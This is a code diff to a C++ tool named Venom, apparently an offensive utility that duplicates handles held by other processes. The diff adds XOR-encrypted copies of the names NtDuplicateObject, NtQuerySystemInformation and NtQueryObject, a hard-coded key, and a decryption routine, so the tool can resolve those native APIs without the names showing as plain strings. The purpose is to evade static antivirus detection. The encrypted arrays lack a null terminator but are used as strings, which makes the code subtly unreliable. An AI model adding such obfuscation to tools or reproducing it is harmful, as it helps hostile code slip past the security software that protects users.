@@ -8,6 +8,26 @@
 #define ObjectNameInformation		1
 #define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xc0000004L)
 
+
+// run VenomEnc.py with random key for 
+// encrypting function names:
+// NtDuplicateObject, NtQuerySystemInformation and NtQueryObject
+
+// XOR encrypted NtDuplicateObject
+unsigned char cNtDuplicateObj[] = { 0x16, 0x11, 0x12, 0x14, 0x3e, 0x2, 0xf, 0x14, 0x8, 0x22, 0x3f, 0x0, 0xe, 0x18, 0xc, 0x4, 0x37 };
+unsigned int cNtDuplicateObjLen = sizeof(cNtDuplicateObj);
+
+// XOR encrypted NtQuerySystemInformation
+unsigned char cNtQuerySysInfo[] = { 0x16, 0x11, 0x7, 0x14, 0x2b, 0x1c, 0x1f, 0x24, 0x10, 0x25, 0x2e, 0x2a, 0x1, 0x3b, 0x7, 0x1, 0x2c, 0x28, 0x34, 0x2c, 0x2c, 0xc, 0x39, 0xf };
+unsigned int cNtQuerySysInfoLen = sizeof(cNtQuerySysInfo);
+
+// XOR encrypted NtQueryObject
+unsigned char cNtQueryObj[] = { 0x16, 0x11, 0x7, 0x14, 0x2b, 0x1c, 0x1f, 0x38, 0xb, 0x3c, 0x3f, 0x2c, 0x18 };
+unsigned int cNtQueryObjLen = sizeof(cNtQueryObj);
+
+// encrypt/decrypt key
+char mySecretKey[] = "XeVaNnfwiVZOlrigCZYM";
+
 // Structs.
 typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO {
 	ULONG   UniqueProcessId;
@@ -52,6 +72,17 @@ typedef NTSTATUS(NTAPI* pNtQueryObject)(
 	ULONG                    ObjectInformationLength,
 	PULONG                   ReturnLength
 );
+
+void XOR(char * data, size_t data_len, char * key, size_t key_len) {
+    int j;
+    j = 0;
+    for (int i = 0; i < data_len; i++) {
+        if (j == key_len - 1) j = 0;
+        data[i] = data[i] ^ key[j];
+        j++;
+    }
+}
+
 
 
 class Venom {
@@ -113,9 +144,14 @@ public:
 		if (!hNtdll)
 			return false;
 
-		pNtDuplicateObject NtDuplicateObject = (pNtDuplicateObject)GetProcAddress(hNtdll, "NtDuplicateObject");
-		pNtQuerySystemInformation NtQuerySystemInformation = (pNtQuerySystemInformation)GetProcAddress(hNtdll, "NtQuerySystemInformation");
-		pNtQueryObject NtQueryObject = (pNtQueryObject)GetProcAddress(hNtdll, "NtQueryObject");
+		XOR((char *) cNtDuplicateObj, cNtDuplicateObjLen, mySecretKey, sizeof(mySecretKey));
+		pNtDuplicateObject NtDuplicateObject = (pNtDuplicateObject)GetProcAddress(hNtdll, cNtDuplicateObj);
+
+		XOR((char *) cNtQuerySysInfo, cNtQuerySysInfoLen, mySecretKey, sizeof(mySecretKey));
+		pNtQuerySystemInformation NtQuerySystemInformation = (pNtQuerySystemInformation)GetProcAddress(hNtdll, cNtQuerySysInfo);
+
+		XOR((char *) cNtQueryObj, cNtQueryObjLen, mySecretKey, sizeof(mySecretKey));
+		pNtQueryObject NtQueryObject = (pNtQueryObject)GetProcAddress(hNtdll, cNtQueryObj);
 
 		if (!NtDuplicateObject || !NtQuerySystemInformation || !NtQueryObject) {
 			CloseHandle(hNtdll);
